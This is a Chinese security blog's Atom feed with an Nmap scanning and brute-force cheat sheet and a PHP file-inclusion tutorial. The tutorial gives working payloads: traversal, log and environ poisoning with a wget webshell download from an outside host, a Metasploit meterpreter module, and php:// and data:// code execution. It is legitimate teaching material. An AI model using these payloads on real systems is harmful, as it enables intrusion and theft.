<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Diam1st&#39;s blog——Humble+Hungry</title>
  
  <subtitle>Love my love~</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0xmj.club/"/>
  <updated>2018-04-23T14:08:28.403Z</updated>
  <id>http://0xmj.club/</id>
  
  <author>
    <name>Diam1st</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Nmap 使用技巧汇总</title>
    <link href="http://0xmj.club/2018/04/23/Nmap-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%B1%87%E6%80%BB/"/>
    <id>http://0xmj.club/2018/04/23/Nmap-使用技巧汇总/</id>
    <published>2018-04-23T14:07:46.000Z</published>
    <updated>2018-04-23T14:08:28.403Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nmap-使用技巧汇总"><a href="#Nmap-使用技巧汇总" class="headerlink" title="Nmap 使用技巧汇总"></a>Nmap 使用技巧汇总</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><pre><code>1. 全面扫描/综合扫描nmap -A 192.168.1.1032. Ping扫描nmap -sP 192.168.1.1/243. 免Ping扫描，穿透防火墙，避免被防火墙发现nmap -P0 192.168.1.1034. TCP SYN Ping 扫描nmap -PS -v 192.168.1.103nmap -PS80,10-100 -v 192.168.1.103 （针对防火墙丢弃RST包）5. TCP ACK Ping 扫描nmap -PA -v 192.168.1.1036. UDP Ping 扫描nmap -PU -v 192.168.1.1037. ICMP Ping Types 扫描nmap -PU -v 192.168.1.103    (ICMP ECHO)nmap -PP -v 192.168.1.103    (ICMP 时间戳)nmap -PM -v 192.168.1.103    (ICMP 地址掩码)8. ARP Ping 扫描nmap -PR -v 192.168.1.1039. 列表 扫描nmap -sL -v 192.168.1.10310. 禁止方向域名解析nmap -n -sL -v 192.168.1.10311. 方向域名解析nmap -R -sL -v 192.168.1.10312. 使用系统域名解析系统nmap --system-dns 192.168.1.2 192.168.1.10313. 扫描IPV6地址nmap -6 IPv614. 路由跟踪nmap --traceroute -v www.sunbridgegroup.com15. SCTP INIT Ping 扫描nmap -PY -v 192.168.1.103</code></pre><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><pre><code>1. 时序扫描nmap -T(0-5) 192.168.1.1032. 常用扫描方式nmap -p 80 192.168.1.103nmap -p 80-100 192.168.1.103nmap -p T:80,U:445 192.168.1.103nmap -F 192.168.1.1.103    (快速扫描)nmap --top-ports 100 192.168.1.103    (扫描最有用的前100个端口)3. TCP SYN 扫描 （高效的扫描方式）[半开链接扫描]nmap -sS -v 192.168.1.1034. TCP 连接扫描[全连接扫描]nmap -sT -v 192.168.1.1035. UDP 连接扫描nmap -sU -p 80-100 192.168.1.1036. 隐蔽扫描nmap -sN 61.241.194.153(NULL扫描)nmap -sF 61.241.194.153(FIN扫描)nmap -sX 61.241.194.153(Xmas扫描)7. TCP ACK 扫描nmap -sA 192.168.1.1038. TCP 窗口扫描nmap -sW -v -F  192.168.1.1039. TCP Maimon 扫描nmap -sM -T4  192.168.1.10310. 自定义 扫描nmap -sT --scanflags SYNURG 192.168.1.10311. 空闲 扫描( 隐藏IP )nmap -sI www.0day.co:80 192.168.1.10312. IP协议 扫描nmap -sO -T4 192.168.1.10313. FTP Bounce 扫描(已经不被支持)</code></pre><h2 id="三、指纹识别与探测"><a href="#三、指纹识别与探测" class="headerlink" title="三、指纹识别与探测"></a>三、指纹识别与探测</h2><pre><code>1. 版本探测（显示banner信息）nmap -sV 192.168.1.103nmap -sV -A 192.168.1.1032. 全端口版本探测nmap -sV --allports 192.168.1.1033. 设置扫描强度nmap -sV --version-intensity (0-9) 192.168.1.1034. 轻量级扫描nmap -sV --version-light 2 192.168.1.1035. 重量级扫描nmap -sV --version-all 192.168.1.1036. 获取详细版本信息nmap -sV --version-trace 192.168.1.1037. RPC扫描nmap -sS -sR 192.168.1.1038. 对指定的目标进行操作系统监测nmap -O --osscan-limit 192.168.1.1039. 推测系统并识别nmap -O --osscan-guess 192.168.1.103</code></pre><h2 id="四、伺机而动"><a href="#四、伺机而动" class="headerlink" title="四、伺机而动"></a>四、伺机而动</h2><pre><code>1. 调整并行扫描组的大小nmap --min-hostgroup 30 192.168.1.110/24nmap --max-hostgroup 30 902 192.168.1.1042. 调整探测报文的并行度nmap --min-parallelism 100 192.168.1.104nmap --max-parallelism 100 192.168.1.1043. 调整探测报文超时nmap --initial-rtt-timeout 100ms 192.168.1.104nmap --max-rtt-timeout 100ms 192.168.1.104nmap --min-rtt-timeout 100ms 192.168.1.1044. 放弃缓慢的目标主机nmap --host-timeout 1800000ms 192.168.1.1045. 调整报文适合时间间隔nmap --scan-delay 1s 192.168.1.104nmap --max-scan-delay 1s 192.168.1.104</code></pre><h2 id="五、防火墙-IDS逃逸"><a href="#五、防火墙-IDS逃逸" class="headerlink" title="五、防火墙/IDS逃逸"></a>五、防火墙/IDS逃逸</h2><pre><code>1. 报文分段nmap -f -v 61.241.194.1532. 指定偏移大小nmap --mtu 16 192.168.1.1043. IP欺骗nmap -D RND:11 192.168.1.104nmap -D 192.168.1.104,192.168.1.103,192.168.1.101 192.168.1.1044. 源地址欺骗nmap -sI www.0day.cn:80 192.168.1.1045. 源端口欺骗nmap --source-port 902 192.168.1.1046. 指定发包长度nmap --data-length 30 192.168.1.1047. 目标主机随机排序nmap --randomize-hosts 192.168.1.1048. MAX地址欺骗nmap -sT -Pn --spoof-mac 0 192.168.1.104</code></pre><h2 id="六、信息收集"><a href="#六、信息收集" class="headerlink" title="六、信息收集"></a>六、信息收集</h2><pre><code>1. IP信息收集nmap --script ip-geolocation-* www.pcos.cn2. WHOIS 查询nmap --script whois-domain www.pcos.cnnmap --script whois-domain --script-args whois.whodb=nofollow www.ithome.comnmap -sn --script whois-domain -v -iL host.txt3. 搜索邮件信息(新版可能没有这个模块)nmap --script http-email-harvest www.pcos.cn4. IP反查nmap -sn --script hostmap-ip2hosts www.pcos.cn5. DNS信息收集nmap --script dns-brute www.pcos.cnnmap --script dns-brute dns-brute.threads=10 www.pcos.cnnmap --script dns-brute dns-brute.threads=10,dns-brute.hostlis www.pcos.cn6. 检索系统信息nmap -p 445 445 192.168.1.104 --script membase-http-info7. 后台打印机服务漏洞nmap --script smb-security-mode.nse -p 445 119.29.155.458. 系统漏洞扫描nmap --script smb-check-vulns.nse -p 445 119.29.155.459.扫描Web漏洞nmap -p80 --script http-stored-xss.nse/http-sql-injection.nse 119.29.155.4510. 通过 Snmp 列举 Windows 服务/账户nmap -sU -p 161 --script=snmp-win32-services 192.168.1.104nmap -sU -f -p 161 --script=snmp-win32-users 192.168.1.11011. 枚举 DNS 服务器的主机名nmap --script dns-brute --script-args dns-brute.domain=baidu.com12. HTTP信息收集nmap -sV -p 80 www.0day.com (HTTP版本探测)nmap -p 80 --script=http-headers www.pcos.cn (HTTP信息头探测)nmap -p 80 --script=http-sitemap-generator www.pcos.cn (爬行Web目录结构)13. 枚举SSL密钥nmap -p 443 --script=ssl-enum-ciphers www.baidu.com14. SSH服务密钥信息探测map -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 127.0.0.1</code></pre><h2 id="七、数据库渗透测试"><a href="#七、数据库渗透测试" class="headerlink" title="七、数据库渗透测试"></a>七、数据库渗透测试</h2><pre><code>1. Mysql列举数据库nmap -p3306 --script=mysql-databases --script-args mysqluser=root,mysqlpass 192.168.1.1012. 列举 MySQL 变量nmap -p3306 --script=mysql-variables 192.168.1.3nmap -sV --script=mysql-variables 192.168.1.3 (无法确定端口的情况下)3. 检查 MySQL 密码nmap -p3306 --script=mysql-empty-password 192.168.1.3nmap -sV -F -T4 --script=mysql-empty-password 192.168.1.34. 审计 MySQL 密码nmap --script=mysql-brute 192.168.1.101nmap -p3306 --script=mysql-brute userdb=/root/passdb.txt passdb=/root/pass.txt 192.168.1.101 (指定字典)5. 审计 MySQL 安全配置nmap -p3306 --script mysql-audit --script-args &quot;mysql-audit.username=&#39;root&#39;,mysql-audit.password=&#39;123&#39;,mysql-audit.filename=&#39;nselib/data/mysql-cis.audit&#39;&quot; 192.168.1.1046. 审计 Oracle 密码nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test 192.168.1.121nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=/tmp/usernames.txt,passdb=/tmp/password.txt 192.168.1.1057. 审计 msSQL密码nmap -p 1433 --script ms-sql-brute --script-args userdb=name.txt,passdb=pass.txt 192.168.1.1048. 检查 msSQL空密码nmap -p 1433 --script ms-sql-empty-password 192.168.1.1049. 读取 msSQL 数据nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.Password=sa 192.168.1.10110. 读取 msSQL 执行系统命令nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=&quot;ipconfig&quot; 192.168.1.10111. 审计 PgSQL 密码nmap -p 5432 --script pgsql-brute 192.168.1.101</code></pre><h2 id="八、渗透测试"><a href="#八、渗透测试" class="headerlink" title="八、渗透测试"></a>八、渗透测试</h2><pre><code>1. 审计 HTTP 身份验证nmap --script=http-brute -p 80 www.pcos.cn2. 审计 FTP 服务器nmap --script ftp-brute -p 21 192.168.1.101nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 192.168.1.101nmap --script=ftp-anon 192.168.1.1013. 审计 Wordpress 程序nmap -p80 --script http-wordpress-brute 192.168.1.110nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.110nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.threads=10 192.168.1.1104. 审计 Joomla 程序nmap -p80 --script http-joomla-brute 192.168.1.110nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt 192.168.1.110nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt,http-joomla-brute.threads=5 192.168.1.1105. 审计 邮件服务器 nmap -p110 --script=pop3-brute 192.168.1.1106. 审计 SMB 口令nmap --script smb-brute.nse -p 445 192.168.1.110nmap --script smb-brute.nse --script-args passdb=pass.txt -p 445 192.168.1.1107. 审计 VNC 服务nmap --script vnc-brute -p 5900 192.168.1.1108. 审计 SMTP 服务器nmap -p 25 --script smtp-brute 192.168.1.110nmap -p 25 --script=smtp-enum-users.nse smith.jack.com (枚举远程系统所有用户)9. 检测 Stuxnet 蠕虫nmap --script stuxnet-detect -p 445 192.168.1.11010. SNMP 服务安全审计nmap -sU -p 161 --script=snmp-netstat 192.168.1.101 (获取目标主机网络连接状态)nmap -sU -p 161 --script=snmp-processes 192.168.1.110 (枚举目标主机的系统进程)nmap -sU -p 161 --script=snmp-win32-services 192.168.1.110 (获得windows服务器的服务)nmap -sU -p 161 --script snmp-brute 192.168.1.110</code></pre><h2 id="九、Zenmap"><a href="#九、Zenmap" class="headerlink" title="九、Zenmap"></a>九、Zenmap</h2><pre><code>1. Intense scan (详细扫描)nmap -T4 -A -v 192.168.1.1012. Intense scan plus UDP (UDP扫描经典使用)nmap -sS -sU -T4 -A -v 192.168.1.1013. Intense scan, all TCP ports (TCP扫描)nmap -p 1-65535 -T4 -A -v 192.168.1.1014. Intense scan, no ping (无Ping扫描)nmap -T4 -A -v -Pn 192.168.1.1015. Ping scan (Ping扫描)nmap -sn 192.168.1.101/246. Quick scannmap -T4 -F 192.168.1.101/247. Quick scan plusnmap -sV -T4 -O -F --version-light 192.168.1.101/248. Quick traceroutenmap -sn --traceroute 192.168.1.1019. Regular scan nmap 192.168.1.10110. Slow comprehensive scannmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; 192.168.1.101</code></pre><h2 id="十-Nmap-技巧"><a href="#十-Nmap-技巧" class="headerlink" title="十. Nmap 技巧"></a>十. Nmap 技巧</h2><pre><code>1. 发送以太网数据包nmap --send-eth 192.168.1.1112. 网络层发送nmap --send-ip 192.168.1.1113. 假定拥有所有权nmap --privileged 192.168.1.1114. 在交互模式中启动nmap --interactive5. 查看 Nmap 版本号nmap -V6. 设置调试级别nmap -d (1-9) 192.168.1.1117. 跟踪发送接收的报文nmap --packet-trace -p 20-30 192.168.1.1118. 列举接口和路由nmap --iflist www.iteye.com9. 指定网络接口nmap -e eth0 192.168.1.11110. 继续中断扫描nmap -oG 1.txt -v 192.168.126.1/24nmap --resume 1.txt (继续扫描)11. Dnmapdnmap_server -f test (指定命令脚本)dnmap_client -s 192.168.1.107 -a test12. 编写 Nse 脚本    (1)    -- The scanning module --        author = &quot;Wing&quot;        categories = {&quot;version&quot;}        portrule = function(host,port)            return port.protocol == &quot;tcp&quot; and port.number == 80 and port.state == &quot;open&quot;        end        action = function(host,port)            return &quot;Found!!!&quot;        end    (2) -- The scanning module --        author = &quot;Wing&quot;        categories = {&quot;version&quot;}        local comm=require &quot;comm&quot;        require &quot;shortport&quot;        local http=require &quot;http&quot;        portrule = function(host,port)            return (port.number == 80) and (port.start==&quot;open&quot;)        end        action = function(host,port)            local uri = &quot;/admin.php&quot;            local response = http.get(host,port,uri)            return &quot;Found!!!&quot;        end13. 探测防火墙nmap --script=firewalk --traceroute 192.168.1.11114. VMware认证破解nmap -p 902 --script vmauthd-brute 192.168.1.107</code></pre><h2 id="十一-Nmap的保存和输出"><a href="#十一-Nmap的保存和输出" class="headerlink" title="十一. Nmap的保存和输出"></a>十一. Nmap的保存和输出</h2><pre><code>1. 标准保存nmap -F -oN d:/test1.txt 192.168.1.1112. XML保存nmap -F -oX d:/test1.xml 192.168.1.1113. 133t 保存nmap -F -oS d:/test2.txt 192.168.1.1114. Grep 保存nmap -F -oG d:/test2.txt 192.168.1.1115. 保存到所有格式nmap -F -oA d:/test2 192.168.1.1116. 补充保存文件nmap -F -append-output -oN d:/test2.txt 192.168.1.1117. 转换 XML 保存nmap -F -oX testB.xml --stylesheet http://www.insecure.org/nmap/data/nmap.xsl 192.168.1.1118. 忽略 XML 声明的 XSL 样式表nmap -oX d:/testC.xml --no-stylesheet 192.168.1.111</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Nmap-使用技巧汇总&quot;&gt;&lt;a href=&quot;#Nmap-使用技巧汇总&quot; class=&quot;headerlink&quot; title=&quot;Nmap 使用技巧汇总&quot;&gt;&lt;/a&gt;Nmap 使用技巧汇总&lt;/h1&gt;&lt;h2 id=&quot;一、主机发现&quot;&gt;&lt;a href=&quot;#一、主机发现&quot; cla
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="Nmap" scheme="http://0xmj.club/tags/Nmap/"/>
    
  </entry>
  
  <entry>
    <title>php文件包含漏洞</title>
    <link href="http://0xmj.club/2018/04/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://0xmj.club/2018/04/23/php文件包含漏洞/</id>
    <published>2018-04-23T13:39:49.000Z</published>
    <updated>2018-04-23T14:06:14.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php文件包含漏洞"><a href="#php文件包含漏洞" class="headerlink" title="php文件包含漏洞"></a>php文件包含漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><p>php中引发文件包含漏洞的通常是以下四个函数：</p><ol><li><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="external">include()</a>   当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</li><li><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="external">include_once()</a>   功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。</li><li><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="external">require()</a>  只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li><li><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="external">require_once()</a> 它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</li></ol><p>当使用这四个函数包含一个新文件时，改文件将作为PHP代码执行，php内核并不在意该被包含的文件是什么类型</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>文件包含漏洞可以分为RFI(远程文件包含)和LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是php.ini中是否开启了allow_url_include。如果开启 了我们就有可能包含远程文件。</p><p>1、本地文件包含LFI(Local File Include)</p><p> 2、远程文件包含RFI(Remote File Include)（需要php.ini中allow_url_include=on  allow_url_fopen = On）</p><p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p><h2 id="一、本地包含"><a href="#一、本地包含" class="headerlink" title="一、本地包含"></a>一、本地包含</h2><h3 id="包含同目录下的文件"><a href="#包含同目录下的文件" class="headerlink" title="包含同目录下的文件"></a>包含同目录下的文件</h3><p>?file=test.txt</p><h3 id="目录遍历："><a href="#目录遍历：" class="headerlink" title="目录遍历："></a>目录遍历：</h3><p>?file=./../../test.txt<br>./当前目录,../上一级目录,这样的遍历目录来读取文件</p><h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p><p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p><p> ?file=../../../../../../../../../var/log/apache/error.log </p><p>1.</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804032017_676.png" alt=""></p><p>​   </p><p>2.可以尝试利用UA插入payload到日志文件</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804032021_793.png" alt=""></p><p>3.MSF攻击模块</p><pre><code>use exploit/unix/webapp/php_includeset rhost 192.168.159.128set rport 80set phpuri /index.php?file=xxLFIxxset path http://172.18.176.147/set payload php/meterpreter/bind_tcpset srvport 8888exploit -z</code></pre><p><strong>日志默认路径</strong></p><p>(1) apache+Linux日志默认路径</p><pre><code>/etc/httpd/logs/access_log</code></pre><p>或者</p><pre><code>/var/log/httpd/access log</code></pre><p> (2) apache+win2003日志默认路径</p><pre><code>D:xamppapachelogsaccess.logD:xamppapachelogserror.log</code></pre><p>(3) IIS6.0+win2003默认日志文件</p><pre><code>C:WINDOWSsystem32Logfiles</code></pre><p>(4) IIS7.0+win2003 默认日志文件</p><pre><code>%SystemDrive%inetpublogsLogFiles</code></pre><p>(5) nginx 日志文件在用户安装目录的logs目录下</p><p>如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里</p><p>也可通过其配置文件Nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log）</p><p><strong>2）web中间件默认配置</strong></p><p> (1) apache+linux 默认配置文件</p><pre><code>/etc/httpd/conf/httpd.conf</code></pre><p>或者</p><pre><code>index.php?page=/etc/init.d/httpd</code></pre><p>(2) IIS6.0+win2003 配置文件</p><p>C:/Windows/system32/inetsrv/metabase.xml </p><p>(3) IIS7.0+WIN 配置文件</p><p>C:WindowsSystem32inetsrvconfigapplicationHost.config</p><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>利用条件：session文件路径已知，且其中内容部分可控。</p><p>PHP默认生成的Session文件往往存放在/tmp目录下<br>/tmp/sess_SESSIONID</p><p>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</p><p>（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）</p><h3 id="包含-proc-self-environ文件"><a href="#包含-proc-self-environ文件" class="headerlink" title="包含/proc/self/environ文件"></a>包含/proc/self/environ文件</h3><p>利用条件：</p><ol><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ol><p>姿势：</p><p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><p>?file=../../../../../../../proc/self/environ</p><p>选择User-Agent 写代码如下：</p><pre><code>&lt;?system(&#39;wget http://www.yourweb.com/oneword.txt -O shell.php&#39;);?&gt;</code></pre><p>然后提交请求。</p><h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p><a href="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" target="_blank" rel="external"><img src="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" alt="img"></a></p><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。另一种方法phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。</p><h2 id="有防御的本地文件包含"><a href="#有防御的本地文件包含" class="headerlink" title="有防御的本地文件包含"></a>有防御的本地文件包含</h2><p>审计中可见这样的包含模版文件：</p><pre><code class="php">&lt;?php    $file = $_GET[&#39;file&#39;];    include &#39;/var/www/html/&#39;.$file.&#39;/test/test.php&#39;;?&gt;</code></pre><p>这段代码指定了前缀和后缀：这样就很“难”直接去包含前面提到的种种文件。</p><ol><li><p>%00截断</p><p>能利用00截断的场景现在应该很少了</p><p>PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(\x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。</p><p>?file=../../../../../../../../../etc/passwd%00<br>(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p></li><li><p>%00截断目录遍历：</p><p>?file=../../../../../../../../../var/www/%00<br>(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p></li><li><p>路径长度截断：</p><p>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.<br>(php版本小于5.2.8可以成功，linux需要文件名长于4096，windows需要长于256)</p><p>利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。</p><p>我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。<br>而利用”./“的方式即可构造出超长目录字符串:</p></li><li><p>点号截断：</p><p>?file=../../../../../../../../../boot.ini/………[…]…………<br>(php版本小于5.2.8可以成功，只适用windows，点号需要长于256)</p></li><li><p>编码绕过</p><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p><ul><li>利用url编码<ul><li>../<ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e/  </li></ul></li><li>..\<ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul></li></ul></li><li>二次编码<ul><li>../<ul><li>%252e%252e%252f</li></ul></li><li>..\<ul><li>%252e%252e%255c</li></ul></li></ul></li></ul></li></ol><h2 id="二、远程文件包含"><a href="#二、远程文件包含" class="headerlink" title="二、远程文件包含"></a>二、远程文件包含</h2><pre><code>?file=[http|https|ftp]://www.bbb.com/shell.txt（可以有三种，http、https、ftp</code></pre><h2 id="有防御的远程文件包含"><a href="#有防御的远程文件包含" class="headerlink" title="有防御的远程文件包含"></a>有防御的远程文件包含</h2><pre><code class="php">&lt;?php     $basePath = $_GET[&#39;path&#39;];    require_once $basePath . &quot;/action/m_share.php&quot;;  ?&gt;</code></pre><p>攻击者可以构造类似如下的攻击URL</p><pre><code class="url">http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?=http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php%23</code></pre><p>产生的原理:</p><pre><code>/?path=http://localhost/test/solution.php?最终目标应用程序代码实际上执行了:require_once &quot;http://localhost/test/solution.php?/action/m_share.php&quot;;(注意，这里很巧妙，问号&quot;?&quot;后面的代码被解释成URL的querystring，这也是一种&quot;截断&quot;思想，和%00一样)攻击者可以在http://localhost/test/solution.php上模拟出相应的路径，从而使之吻合</code></pre><h2 id="PHP中的封装协议-伪协议"><a href="#PHP中的封装协议-伪协议" class="headerlink" title="PHP中的封装协议(伪协议)"></a>PHP中的封装协议(伪协议)</h2><p><a href="http://cn2.php.net/manual/zh/wrappers.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/wrappers.php</a></p><pre><code>file:///var/www/html  访问本地文件系统ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   访问FTP(s) URLsdata://  数据流http:// — 访问 HTTP(s) URLsftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流zlib:// — 压缩流data:// — Data (RFC 2397)glob:// — 查找匹配的文件路径模式phar:// — PHP Archivessh2:// — Secure Shell 2rar:// — RARogg:// — Audio streamsexpect:// — 处理交互式的流</code></pre><h3 id="利用php流input："><a href="#利用php流input：" class="headerlink" title="利用php流input："></a>利用php流input：</h3><p>利用条件：</p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li></ol><pre><code>index.php?file=php://inputPOST:&lt;? phpinfo();?&gt;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201804032124_161.png" alt=""></p><p>结果将在index.php所在文件下的文件shell.php内增加”&lt;?php phpinfo();?&gt;”一句话</p><h3 id="利用php流filter："><a href="#利用php流filter：" class="headerlink" title="利用php流filter："></a>利用php流filter：</h3><p>?file=php://filter/convert.base64-encode/resource=index.php</p><p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p><p>其他姿势：</p><pre><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></pre><p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p><h3 id="利用data-URIs："><a href="#利用data-URIs：" class="headerlink" title="利用data URIs："></a>利用data URIs：</h3><p>利用条件：</p><ol><li>php版本大于等于php5.2</li><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ol><p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p><pre><code>?file=data:text/plain,&lt;?php phpinfo();?&gt;?file=data:text/plain;base64,base64编码的payloadindex.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt;</code></pre><p>(需要allow_url_include=On)</p><h3 id="利用XSS执行任意代码："><a href="#利用XSS执行任意代码：" class="headerlink" title="利用XSS执行任意代码："></a>利用XSS执行任意代码：</h3><p>?file=<a href="http://127.0.0.1/path/xss.php?xss=phpcode" target="_blank" rel="external">http://127.0.0.1/path/xss.php?xss=phpcode</a></p><p>利用条件：</p><ol><li>allow_url_fopen = On</li><li>并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊</li></ol><h3 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h3><p>glob:// 查找匹配的文件路径模式</p><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p><ol><li>php版本大于等于php5.3.0</li></ol><p>姿势：</p><p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/9.png?raw=true" target="_blank" rel="external"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/9.png?raw=true" alt="img"></a></p><p>指定绝对路径</p><pre><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</code></pre><p>或者使用相对路径（这里test.zip就在当前目录下）</p><pre><code>index.php?file=phar://test.zip/phpinfo.txt</code></pre><p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/10.png?raw=true" target="_blank" rel="external"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/10.png?raw=true" alt="img"></a></p><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p><ol><li>php版本大于等于php5.3.0</li></ol><pre><code>&lt;?php$file = $_GET[&#39;file&#39;];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){    include($file);}?&gt;</code></pre><p>截取过来的后面4格字符,判断是不是jpg,如果是jpg才进行包含</p><p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p><p>然后我们构造zip://php.zip#php.jpg</p><pre><code>index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23php.jpg</code></pre><p>注意事项：</p><ol><li>若是使用相对路径，则会包含失败。</li><li>协议原型：zip://archive.zip#dir/file.txt</li><li>注意url编码,因为这个#会和url协议中的#冲突</li></ol>]]></content>
    
    <summary type="html">
    
      
      
